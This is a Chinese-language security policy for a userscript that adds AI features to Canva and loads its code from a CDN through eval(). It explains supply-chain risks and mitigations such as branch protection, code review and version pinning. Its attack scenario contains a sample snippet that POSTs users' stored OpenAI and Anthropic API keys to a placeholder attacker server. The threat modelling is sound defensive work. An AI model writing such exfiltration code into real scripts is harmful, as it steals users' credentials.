# 🔒 安全策略 (Security Policy)

## 风险模型

本项目的架构决定了**用户信任仓库维护者**。以下是需要了解的安全事实：

### 代码加载链

```
用户安装 loader → 每次打开 canva.cn → loader 从 CDN 拉取最新代码 → eval() 执行
```

**任何能向 `master` 分支推送代码的人，都可以修改 `dist/canva-ai-assistant.js`，在所有用户下次打开 canva.cn 时执行任意代码。**

### 攻击场景

如果攻击者获得仓库写入权限，他们可以在代码中插入：

```javascript
// 恶意代码示例 — 窃取 API Key
GM_xmlhttpRequest({
    method: 'POST',
    url: 'https://evil-server.com/collect',
    data: JSON.stringify({
        openai: GM_getValue('caa_openai_key'),
        claude: GM_getValue('caa_anthropic_key'),
    }),
    headers: { 'Content-Type': 'application/json' },
});
```

用户下次使用可画时，API Key 就会被静默发送到攻击者服务器。

---

## 防护措施

### 仓库维护者必须做的事

#### 1. 启用 GitHub 分支保护（最重要！）

免费、即时生效，阻止直接 push 到 master：

1. 打开 https://github.com/xiaowang4588/canva_helper-script/settings/branches
2. 点击 **Add branch protection rule**
3. **Branch name pattern**: `master`
4. ✅ 勾选 **Require a pull request before merging**
5. ✅ 勾选 **Require approvals** (至少 1 人)
6. ✅ 勾选 **Dismiss stale pull request approvals when new commits are pushed**
7. 点击 **Create**

设置后，任何代码变更都必须通过 PR + Review 才能进入 master。没有人能静默修改代码。

#### 2. 审查所有 Pull Request

- 不接受来源不明的 PR
- 仔细检查任何修改 API 调用逻辑的代码
- 特别关注 `GM_xmlhttpRequest`、`fetch`、`XMLHttpRequest` 等网络请求
- 确认修改后的 URL 都是合法的 AI 服务商域名

#### 3. 保护你的 GitHub 账号

- 开启双因素认证 (2FA)
- 使用强密码
- 不要在公共设备上登录

### 用户可以做什么

#### 审查代码（推荐）

安装前查看 `dist/canva-ai-assistant.js`，确认：
- 所有 `GM_xmlhttpRequest` 的 URL 都是合法的 AI 服务商
- 没有向不明服务器发送数据的代码

#### Fork 仓库（最安全）

```bash
# 1. Fork 本仓库
# 2. Clone 你的 fork
# 3. 修改 loader 中的 URL 指向你的 fork
# 4. 安装你自己的 loader
```

这样你完全控制加载的代码，不受上游仓库变更影响。

#### 锁定版本

在意安全的用户可以安装**独立版脚本**（`canva-ai-assistant.user.js`），它不依赖 CDN 自动更新。代价是需要手动更新。

---

## 报告漏洞

如果你发现了安全漏洞，请通过以下方式**私下**报告（不要公开提 Issue）：

- 📧 发送邮件到仓库维护者
- 或在 GitHub 上使用 **Private vulnerability reporting**

我们会尽快响应并在修复后公开致谢。

---

## 安全设计权衡

| 设计选择 | 安全风险 | 便利性 |
|----------|----------|--------|
| CDN 自动更新 (`@master`) | 维护者账号被盗 = 所有用户受影响 | 更新零操作 |
| 版本锁定 (`@v1.0.2`) | 恶意代码无法自动分发 | 需手动换版本 |
| 独立版脚本 | 无自动更新风险 | 需手动更新 |

本项目选择 CDN 自动更新方案，因此**分支保护是底线要求**。

---

## 最后更新

2026-07-15
